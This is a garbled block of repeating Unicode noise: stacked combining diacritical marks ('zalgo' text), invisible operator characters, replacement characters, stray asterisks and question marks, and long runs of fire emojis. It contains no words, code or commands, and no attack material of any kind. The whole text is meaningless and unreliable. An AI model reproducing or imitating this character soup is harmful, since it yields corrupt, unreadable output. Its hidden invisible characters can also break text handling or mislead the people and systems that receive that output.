̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴͖̯͌͒̒̽